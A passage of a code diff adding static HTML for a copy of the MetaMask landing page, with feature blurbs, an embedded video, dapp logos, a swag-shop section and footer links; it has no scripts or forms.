+                  MetaMask provides the simplest yet most secure way to connect
+                  to blockchain-based applications. You are always in control
+                  when interacting on the new decentralized web.
+                </p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="background4 mb-5 pb-5">
+          <div class="row justify-content-md-center mt-5">
+            <div class="col-md-5">
+              <div class="card-body">
+                <h2 class="card-title boxTitle2 pt-5 pb-3">Own your data</h2>
+                <p class="card-text boxText">
+                  MetaMask generates passwords and keys on your device, so only
+                  you have access to your accounts and data. You always choose
+                  what to share and what to keep private.
+                </p>
+              </div>
+            </div>
+
+            <div class="col-md-5 text-center">
+              <img src="./images/Browse-illo.svg" class="boxImage img-fluid" />
+            </div>
+          </div>
+        </section>
+      </div>
+      <section class="background5 mb-5">
+        <div class="card bg-dark">
+          <img src="./images/meta.png" class="mx-auto d-block m-5 img-fluid" />
+          <h3 class="text-light mx-auto m-2">Get started</h3>
+          <button type="button" class="btn btn-primary mx-auto m-5">
+            Sign-up
+          </button>
+        </div>
+      </section>
+
+      <section class="background6 mt-5 mb-5">
+        <div class="text-center">
+          <h2 class="pb-4 pt-5">What is MetaMask?</h2>
+
+          <div class="embed-responsive embed-responsive-16by9">
+            <iframe
+              class="embed-responsive-item w-50 Yvideo mb-5"
+              src="https://www.youtube.com/embed/YVgfHZMFFFQ"
+              allowfullscreen
+            ></iframe>
+          </div>
+        </div>
+      </section>
+
+      <div class="container">
+        <section class="background7 mt-5">
+          <div class="box pt-5">
+            <h2 class="text-center">Your key to blockchain applications</h2>
+            <h6 class="text-center w-90">
+              MetaMask provides an essential utility for blockchain newcomers,
+              token traders, crypto gamers, and developers. Over a million
+              <br />downloads and counting!
+            </h6>
+            <div class="row">
+              <img
+                src="./images/dapp-aave.webp"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-axieinfinity.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-compound.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-gitcoin.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+            </div>
+            <div class="row">
+              <img
+                src="./images/dapp-maker.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-opensea.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-rarible.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+              <img
+                src="./images/dapp-uniswap.png"
+                class="col-md-3 img-fluid ps-5 pe-5"
+              />
+            </div>
+          </div>
+        </section>
+      </div>
+      <section class="background8 bg-dark w-100">
+        <div class="box text-center text-light">
+          <h2 class="pt-5 pb-3">Devolopers</h2>
+          <h6>
+            MetaMask is powered by a strong community from across the globe.
+            Interested in contributing? Find out how and what to contribute
+            using the<br />resources below
+          </h6>
+          <h5 class="p-3">Open Issues ></h5>
+          <h5 class="p-2">Open Bounties ></h5>
+          <h5 class="p-2">Documentation ></h5>
+          <h5 class="p-2 pb-5">Contributing Guidelines ></h5>
+        </div>
+      </section>
+
+      <section class="background9">
+        <div class="row justify-content-center p-4">
+          <div class="col-md-3">
+            <img
+              class="img-fluid"
+              src="./images/mm-shop-hoodie.webp"
+              alt="please try again"
+            />
+          </div>
+          <div class="col-md-3 p-4 mt-5">
+            <h3 class="pt-5 mt-5 text-light">Shop MetaMask Swag</h3>
+            <button type="button" class="btn btn-outline-light ps-3 pe-3 mt-3">
+              Shop now
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <section class="background10 mb-5">
+        <div class="text-center">
+          <h4 class="p-2 mt-5">Receive our Newsletter</h4>
+          <h6 class="p-2">Sign up to receive updates and announcements</h6>
+          <button type="button" class="btn btn-primary p-3 mt-3 ps-3 pe-3">
+            Sign-up
+          </button>
+        </div>
+      </section>
+
+      <section class="background11" id="Bg11">
+        <div class="container fLogo">
+          <img
+            src="./images/metamask.png"
+            id="dLogo"
+            class="footerLogo m-4 mt-5 mb-5"
+          />
+        </div>
+        <div class="row justify-content-md-center ms-1 me-1">
+          <div class="col-md-2 mb-3">
+            <h5 class="fTitle pb-2">Learn More</h5>
+            <h6 class="fItem">About</h6>
+            <h6 class="fItem">Developers Docs</h6>
+            <h6 class="fItem">Download</h6>
+            <h6 class="fItem">Documentation</h6>
+            <h6 class="fItem">MetaMask Institutional</h6>
+            <h6 class="fItem">Security</h6>
+          </div>
+          <div class="col-md-2 mb-3">
+            <h5 class="fTitle pb-2">Get Involved</h5>
+            <h6 class="fItem">GitHub</h6>
+            <h6 class="fItem">Gitcoin</h6>
+            <h6 class="fItem">Open Positions</h6>
+            <h6 class="fItem">Swag Shop</h6>
+            <h6 class="fItem">Press & Partnerships</h6>
+          </div>
+          <div class="col-md-2 mb-3">
+            <h5 class="fTitle pb-2">Connect</h5>
+            <h6 class="fItem">FAQs</h6>
+            <h6 class="fItem">Support</h6>
+            <h6 class="fItem">News</h6>
+            <h6 class="fItem">Twitter</h6>
+          </div>
+
+          <div class="col-md-2 mb-3">
+            <h5 class="fTitle pb-2">Legal</h5>
+            <h6 class="fItem">Privacy Policy</h6>
+            <h6 class="fItem">Terms of Use</h6>
+            <h6 class="fItem">Contributor License</h6>
+            <h6 class="fItem">Agreement</h6>
+            <h6 class="fItem">Site Map</h6>
+          </div>
+        </div>
+        <div class="container">
+          <h6 class="m-3 pb-4">@2022 MetaMask • A ConsenSys Formation</h6>
+        </div>
+      </section>
+    </div>
+  </body>
+</html>
